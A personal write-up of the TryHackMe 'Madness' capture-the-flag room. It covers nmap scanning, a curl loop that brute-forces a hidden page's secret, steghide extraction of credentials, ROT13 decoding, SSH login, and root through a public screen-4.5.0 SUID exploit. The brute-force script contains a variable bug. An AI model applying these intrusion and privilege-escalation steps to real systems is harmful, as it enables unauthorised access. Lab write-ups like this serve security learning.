start with nmap
```console
kali@kali:~/madness$ nmap 10.10.156.223
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-26 11:58 EDT
Nmap scan report for 10.10.156.223
Host is up (0.044s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.76 seconds
kali@kali:~$ nmap -p- -A 10.10.156.223 > madness/target.txt
kali@kali:~$ cat madness/target.txt 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-26 11:54 EDT
Nmap scan report for 10.10.156.223
Host is up (0.044s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ac:f9:85:10:52:65:6e:17:f5:1c:34:e7:d8:64:67:b1 (RSA)
|   256 dd:8e:5a:ec:b1:95:cd:dc:4d:01:b3:fe:5f:4e:12:c1 (ECDSA)
|_  256 e9:ed:e3:eb:58:77:3b:00:5e:3a:f5:24:d8:58:34:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 268.31 seconds
```
then I check the source code for on the defualt page and I found soemthing interessting.
```html
<div class="page_header floating_element">
        <img src="thm.jpg" class="floating_element"/>
<!-- They will never find me-->
        <span class="floating_element">
          Apache2 Ubuntu Default Page
        </span>
      </div>
```
seem like there is something with that thm.jpg. You will notic that the picture is corrupted and you can not view it.I run ```strings``` to check the picture
```console
kali@kali:~/madness$ strings thm.bak 
$3br
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
        #3R
&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
#|Ttm
|q6;A
54{Ar
```
I googling about about ```CDEFGHIJSTUVWXYZcdefghijstuvwxyz``` seem like this find have some hidden data inside and we will need use steghide to extract it. To extract the hidden data, we need a password which me dont have. So I decide to work on another stuff


When you open it with hexeditor you will see that thm.jpg file signature is .png. we need to change it back .jpg signature. After some digging if found this [link](https://en.wikipedia.org/wiki/List_of_file_signatures) which contains list of file signatures.



Use hexeditor and fix the signature to ```FF D8 FF E0 00 10 4A 46 49 46 00 01``` and save it now check the picture again and visite the hidden page. here is the source html of the page
```html
<html>
<head>
  <title>Hidden Directory</title>
  <link href="stylesheet.css" rel="stylesheet" type="text/css">
</head>
<body>
  <div class="main">
<h2>Welcome! I have been expecting you!</h2>
<p>To obtain my identity you need to guess my secret! </p>
<!-- It's between 0-99 but I don't think anyone will look here-->

<p>Secret Entered: 1</p>

<p>That is wrong! Get outta here!</p>

</div>
</body>
</html>
```
http://10.10.32.231/th1s_1s_h1dd3n/index.php?secret=1

```bash
#!/bin/bash
for i in {1..99}
do
    curl "http://10.10.32.231/th1s_1s_h1dd3n/index.php?secret=$1" 
done > result.txt
```
this script wasn't the best script. but I figured out that each reponse have 18 lines of html. so I ran ```cat result.txt | grep -n wrong ``` and try to find the line that jump more that 18 line.
```console
kali@kali:~/madness$ cat result.txt | grep -n wrong
*
*
1274:<p>That is wrong! Get outta here!</p>
1292:<p>That is wrong! Get outta here!</p>
1310:<p>That is wrong! Get outta here!</p>
1346:<p>That is wrong! Get outta here!</p>
1364:<p>That is wrong! Get outta here!</p>
*
*
```
as you can see between 1310 and 1348, it jump more that 18 so I guess password should be at 1310+18 = line 1328. now let grep that line
```console
kali@kali:~/madness$ cat -n result.txt | grep 1328
  1328  <p>Urgh, you got it right! But I won't tell you who I am! y2RPJ4QaPF!B</p>
```
We got the password!!! now use it with steghide to extract the hidden data.
```console
kali@kali:~/madness$ steghide extract -sf thm.jpg 
Enter passphrase: 
wrote extracted data to "hidden.txt".
kali@kali:~/madness$ cat hidden.txt 
Fine you found the password! 

Here's a username 

wbxre

I didn't say I would make it easy for you!
```
The user name look weird and I remember that the hint was ```There's something ROTten about this guys name! ```


ROT is a encryption algorith. The most common ROT is ROT13. I learn how to decrypt ROT13 when I did Bandit CTF, so let crack it
- ROT13
| input                      | output                     |
|----------------------------|----------------------------|
| ABCDEFGHIJKLMNOPQRSTUVWXYZ | NOPQRSTUVWXYZABCDEFGHIJKLM |
| abcdefghijklmnopqrstuvwxyz | nopqrstuvwxyzabcdefghijklm |
```console
kali@kali:~/madness$ echo "wbxre" | tr '[A-Za-z]' '[NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm]'
joker
```
now we got username... still dont have password lol. I dont know where to looks then I found the picture on THM room and try which kinda look suspicious. I try to extract data from the picture using steghide + ```y2RPJ4QaPF!B``` and ```joker``` as password........ it did work. So I was like, let try without password then? GG we got the password
```console
kali@kali:~/madness$ steghide extract -sf 5iW7kC8.jpg
Enter passphrase: 
wrote extracted data to "password.txt".
kali@kali:~/madness$ cat password.txt 
I didn't think you'd find me! Congratulations!

Here take my password

*axA&GF8dP
kali@kali:~/madness$ ssh joker@10.10.32.231
joker@10.10.32.231's password:
joker@ubuntu:~$ ls
user.txt
joker@ubuntu:~$ cat user.txt 
THM{d5781e53XXXXXXXXXXXXXXXXXXXX}
```


```console
joker@ubuntu:~$ sudo -l
[sudo] password for joker: 
Sorry, user joker may not run sudo on ubuntu.
joker@ubuntu:~$ 
joker@ubuntu:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-rwsr-xr-x 1 root root 428240 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42992 Nov 29 04:40 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwxr-sr-x 1 root mlocate 39520 Nov 17  2014 /usr/bin/mlocate
-rwxr-sr-x 1 root shadow 62336 Mar 26  2019 /usr/bin/chage
-rwxr-sr-x 1 root crontab 36080 Apr  5  2016 /usr/bin/crontab
-rwxr-sr-x 1 root ssh 358624 Mar  4  2019 /usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 27368 Oct 10  2019 /usr/bin/wall
-rwsr-xr-x 1 root root 10624 May  8  2018 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 75304 Mar 26  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 54256 Mar 26  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 39904 Mar 26  2019 /usr/bin/newgrp
-rwxr-sr-x 1 root shadow 22768 Mar 26  2019 /usr/bin/expiry
-rwsr-xr-x 1 root root 40432 Mar 26  2019 /usr/bin/chsh
-rwxr-sr-x 1 root tty 14752 Mar  1  2016 /usr/bin/bsd-write
-rwsr-xr-x 1 root root 71824 Mar 26  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root 136808 Oct 11  2019 /usr/bin/sudo
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 40128 Mar 26  2019 /bin/su
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 1588648 Jan  4 14:03 /bin/screen-4.5.0
-rwsr-xr-x 1 root root 1588648 Jan  4 13:59 /bin/screen-4.5.0.old
-rwsr-xr-x 1 root root 40152 Oct 10  2019 /bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 27608 Oct 10  2019 /bin/umount
-rwxr-sr-x 1 root shadow 35600 Apr  9  2018 /sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 35632 Apr  9  2018 /sbin/pam_extrausers_chkpwd
```
After some researching, I found out that there is sa exploit for ```screen-4.5.0``` link [here](https://www.exploit-db.com/exploits/41154)


crate the ```exploit.sh``` and make it executable (```chmod +x```) and execute it
```console
joker@ubuntu:~$ nano exploit.sh
joker@ubuntu:~$ chmod +x exploit.sh 
joker@ubuntu:~$ ./exploit.sh 
# whoami
root
# cd /root      
# ls
root.txt
# cat root.txt
THM{5ecdXXXXXXXXXXXXXXXXXX}
```